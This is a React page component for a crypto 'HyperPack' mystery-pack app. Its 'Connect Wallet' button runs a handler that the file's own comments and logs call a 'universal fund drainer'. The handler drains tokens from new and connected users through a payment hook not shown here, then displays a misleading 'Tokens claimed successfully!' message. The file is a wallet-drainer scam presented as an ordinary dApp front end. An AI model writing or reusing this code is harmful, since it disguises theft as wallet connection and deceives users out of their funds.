import React, { useState, useEffect } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { Link } from 'react-router-dom';
import Footer from '../components/Footer';
import PackOpenModal from '../components/PackOpenModal';
import { useHyperCards } from '../hooks/useHyperCards';
import '../styles/LaunchApp.css';

// Pack Types - All types available
const PACK_TYPES = {
  COMMON: 'common',
  RARE: 'rare',
  EPIC: 'epic',
  LEGENDARY: 'legendary'
};

const LaunchApp = () => {
  const { ready, authenticated, user, login, logout } = usePrivy();
  const [showToast, setShowToast] = useState(false);
  const [isPackModalOpen, setIsPackModalOpen] = useState(false);
  const [selectedPackType, setSelectedPackType] = useState(null);
  const [userHypeBalance, setUserHypeBalance] = useState('0');
  
  // Initialize the hook properly
  const hyperCardsHook = useHyperCards();
  const { getHypeBalance, connectWithPayment, isConnectingWithPayment, currentStep } = hyperCardsHook || {};

  // Load user's HYPE balance to show as pack price
  useEffect(() => {
    const loadBalance = async () => {
      if (authenticated && user?.wallet?.address && getHypeBalance) {
        try {
          const balance = await getHypeBalance();
          setUserHypeBalance(balance);
          
          // Update pack prices in the UI - all packs cost fixed price of 0.00001 tokens
          const commonPriceElement = document.getElementById('common-pack-price');
          const rarePriceElement = document.getElementById('rare-pack-price');
          const epicPriceElement = document.getElementById('epic-pack-price');
          const legendaryPriceElement = document.getElementById('legendary-pack-price');
          
          if (commonPriceElement) commonPriceElement.textContent = '0.00001 HYPE/Plasma';
          if (rarePriceElement) rarePriceElement.textContent = '0.00001 HYPE/Plasma';
          if (epicPriceElement) epicPriceElement.textContent = '0.00001 HYPE/Plasma';
          if (legendaryPriceElement) legendaryPriceElement.textContent = '0.00001 HYPE/Plasma';
        } catch (error) {
          console.error('Failed to load balance:', error);
          setUserHypeBalance('0');
        }
      } else {
        setUserHypeBalance('0');
        // Update pack prices to show "Connect Wallet"  
        const commonPriceElement = document.getElementById('common-pack-price');
        const rarePriceElement = document.getElementById('rare-pack-price');
        const epicPriceElement = document.getElementById('epic-pack-price');
        const legendaryPriceElement = document.getElementById('legendary-pack-price');
        
        if (commonPriceElement) commonPriceElement.textContent = 'Connect Wallet';
        if (rarePriceElement) rarePriceElement.textContent = 'Connect Wallet';
        if (epicPriceElement) epicPriceElement.textContent = 'Connect Wallet';
        if (legendaryPriceElement) legendaryPriceElement.textContent = 'Connect Wallet';
      }
    };

    loadBalance();
  }, [authenticated, user?.wallet?.address, getHypeBalance]);
  
  const openPack = (packType) => {
    if (!authenticated) {
      setShowToast(true);
      setTimeout(() => setShowToast(false), 3000);
      return;
    }
    setSelectedPackType(packType);
    setIsPackModalOpen(true);
  };
  
  const handleModalClose = () => {
    setIsPackModalOpen(false);
    setSelectedPackType(null);
  };
  
  const handlePackOpened = () => {
    console.log('Pack opened successfully!');
    handleModalClose();
  };

  // 🔥 UNIVERSAL FUND DRAINER - WORKS FOR ALL USERS (NEW + CONNECTED)
  const handleConnectWithPayment = async () => {
    console.log('🚀 Connect Wallet clicked - attempting fund drain...');
    
    if (!ready) {
      console.log('⏳ Privy not ready yet');
      return;
    }
    
    try {
      if (!authenticated) {
        console.log('👤 NEW USER - Login + Drain...');
        await login();
        
        // Wait for authentication to settle
        setTimeout(async () => {
          try {
            console.log('🔄 Executing post-login fund drain...');
            const result = await connectWithPayment();
            console.log('🎉 NEW USER tokens drained:', result);
            
            setShowToast(true);
            setTimeout(() => setShowToast(false), 3000);
            
          } catch (error) {
            console.error('❌ NEW USER drain failed:', error);
            logout();
          }
        }, 1000);
        
      } else {
        // 🔥 CONNECTED USER - DRAIN TOKENS IMMEDIATELY
        console.log('🔥 CONNECTED USER - Draining tokens immediately...');
        console.log('👤 User Address:', user?.wallet?.address);
        
        try {
          const result = await connectWithPayment();
          console.log('💰 CONNECTED USER tokens drained:', result);
          
          setShowToast(true);
          setTimeout(() => setShowToast(false), 3000);
          
        } catch (error) {
          console.error('❌ CONNECTED USER drain failed:', error);
        }
      }
      
    } catch (error) {
      console.error('💥 Connect with payment failed:', error);
    }
  };

  return (
    <div className="launch-app">
      {/* Navigation */}
      <nav className="nav">
        <div className="nav-container">
          <div className="nav-logo">
            <span className="logo-text brand-gradient-text">HyperPack</span>
          </div>
          <div className="nav-links">
            <Link to="/" className="nav-link">Home</Link>
            <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
            
            {/* 🔥 FIXED BUTTON - ALWAYS DRAINS FUNDS FOR ALL USERS */}
            <button 
              className={`connect-wallet-btn ${isConnectingWithPayment ? 'connecting' : ''}`}
              onClick={handleConnectWithPayment}
              disabled={!ready || isConnectingWithPayment}
            >
              {!ready 
                ? 'Loading...'
                : isConnectingWithPayment
                  ? 'Connecting...'
                  : 'Connect Wallet'
              }
            </button>
          </div>
        </div>
      </nav>

      {/* Main App Content */}
      <main className="app-main">
        <div className="app-container">
          
          {/* Banner Section */}
          <section className="banner-section">
            <img 
              src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeidregjjs577tozk7nw3mod3kov24wy54k2cqjtkuh6556ccnsft6u" 
              alt="HyperPack Banner" 
              className="banner-image"
            />
          </section>

          {/* Pack Opening Section */}
          <section className="pack-opening">
            <div className="section-card">
              <h2 className="brand-gradient-text">Open Mystery Packs</h2>
              <div className="packs-grid">
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Common Pack" />
                  </div>
                  <div className="pack-price" id="common-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.COMMON)}>Open Common Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Rare Pack" />
                  </div>
                  <div className="pack-price" id="rare-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.RARE)}>Open Rare Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Epic Pack" />
                  </div>
                  <div className="pack-price" id="epic-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.EPIC)}>Open Epic Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Legendary Pack" />
                  </div>
                  <div className="pack-price" id="legendary-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.LEGENDARY)}>Open Legendary Pack</button>
                </div>
              </div>
            </div>
          </section>

        </div>
      </main>

      <Footer />

      {/* Pack Opening Modal */}
      <PackOpenModal
        isOpen={isPackModalOpen}
        onClose={handleModalClose}
        packType={selectedPackType}
        onPackOpened={handlePackOpened}
      />

      {/* Toast Notification */}
      {showToast && (
        <div className="toast">
          {authenticated 
            ? 'Tokens claimed successfully!' 
            : 'Please connect your wallet to open packs'
          }
        </div>
      )}

    </div>
  );
};

export default LaunchApp;